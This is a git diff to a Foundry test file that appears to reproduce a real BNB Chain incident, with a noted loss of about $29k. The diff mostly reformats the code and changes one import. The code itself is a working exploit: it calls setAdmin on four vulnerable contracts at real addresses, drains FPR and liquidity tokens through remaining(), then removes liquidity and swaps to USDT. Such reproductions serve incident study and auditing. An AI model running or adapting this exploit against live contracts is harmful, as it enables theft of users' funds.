@@ -3,7 +3,7 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
 import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
 // @KeyInfo - Total Lost : ~$29k
@@ -22,14 +22,11 @@ import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
 // https://twitter.com/chainlight_io/status/1603282848311480320
 
 interface VulContract {
-
     function setAdmin(address) external;
     function remaining(address, address) external;
-
 }
 
 contract ContractTest is Test {
-
     address[4] vulContracts = [
         0x81c5664be54d89E725ef155F14cf34e6213297B7,
         0xE2f0A9B60858f436e1f74d8CdbE03625b9bcc532,
@@ -39,8 +36,10 @@ contract ContractTest is Test {
     uint256[3] attackBlock = [23_904_153, 23_904_166, 23_904_174];
     IERC20 constant FPR = IERC20(0xA9c7ec037797DC6E3F9255fFDe422DA6bF96024d);
     IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
-    IUniswapV2Router constant router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
-    IUniswapV2Pair constant pair = IUniswapV2Pair(0x039D05a19e3436c536bE5c814aaa70FcdbDde58b);
+    IUniswapV2Router constant router =
+        IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+    IUniswapV2Pair constant pair =
+        IUniswapV2Pair(0x039D05a19e3436c536bE5c814aaa70FcdbDde58b);
 
     function setUp() public {
         vm.createSelectFork("bsc", 23_904_152);
@@ -60,18 +59,31 @@ contract ContractTest is Test {
             VulContract(vulContracts[i]).remaining(address(this), address(FPR));
             console.log(FPR.balanceOf(address(this)));
             router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-                FPR.balanceOf(address(this)), 0, path, address(this), block.timestamp
+                FPR.balanceOf(address(this)),
+                0,
+                path,
+                address(this),
+                block.timestamp
             );
         }
 
         VulContract(vulContracts[3]).setAdmin(address(this));
         VulContract(vulContracts[3]).remaining(address(this), address(pair));
         router.removeLiquidity(
-            address(USDT), address(FPR), pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp
+            address(USDT),
+            address(FPR),
+            pair.balanceOf(address(this)),
+            0,
+            0,
+            address(this),
+            block.timestamp
         );
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            FPR.balanceOf(address(this)), 0, path, address(this), block.timestamp
+            FPR.balanceOf(address(this)),
+            0,
+            path,
+            address(this),
+            block.timestamp
         );
     }
-
 }
